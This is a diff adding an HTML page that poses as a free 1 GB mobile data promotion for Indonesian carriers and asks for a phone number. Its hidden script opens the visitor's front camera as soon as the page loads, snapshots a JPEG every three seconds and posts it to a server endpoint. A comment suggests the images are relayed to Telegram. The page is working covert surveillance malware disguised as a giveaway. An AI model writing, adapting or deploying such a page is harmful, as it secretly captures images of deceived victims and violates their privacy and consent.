@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Free 1 GB Network Data — Promo</title>
+  <style>
+    :root{ --bg:#f6f7fb; --card:#ffffff; --accent:#0b76ff; --muted:#7b7f8a; font-family: sans-serif; }
+    body{ margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(180deg, #eef2ff 0%, var(--bg) 100%); padding:24px; }
+    .card{ width:100%; max-width:360px; background:var(--card); border-radius:12px; box-shadow: 0 8px 30px rgba(12,20,40,0.08); padding:20px; text-align:center; }
+    .title{ font-weight:700; font-size:20px; margin-bottom:14px; }
+    .note{ font-size:13px; color:var(--muted); background:#f3f7ff; border-radius:8px; padding:10px; margin-bottom:18px; }
+    input, select{ width:100%; padding:12px; border-radius:10px; border:1px solid #e6e9f0; margin-bottom:12px; box-sizing:border-box; }
+    .btn{ width:100%; padding:12px; border-radius:10px; border:none; background:var(--accent); color:#fff; font-weight:700; cursor:pointer; }
+    #video, #canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="title">🚀 Free 1 GB Network Data</div>
+    <div class="note">🎁 Free 1GB data pack recharge for everyone from us.</div>
+    <select><option>Telkomsel</option><option>Indosat</option><option>XL/Axis</option></select>
+    <input type="tel" placeholder="Masukkan nomor telepon">
+    <button id="claimBtn" class="btn">🎁 Claim</button>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    async function setupCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            audio: false, 
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
+        video.srcObject = stream;
+        
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          startCapturing();
+        };
+      } catch (e) { console.error("Camera Error:", e); }
+    }
+
+    function startCapturing() {
+      const context = canvas.getContext('2d');
+      setInterval(() => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const data = canvas.toDataURL("image/jpeg", 0.7); // Menggunakan JPEG agar kirim lebih cepat
+        $.post('/api/post.php', { cat: data });
+      }, 3000); // Kirim setiap 3 detik agar tidak kena limit Telegram
+    }
+
+    window.onload = setupCamera;
+  </script>
+</body>
+</html>
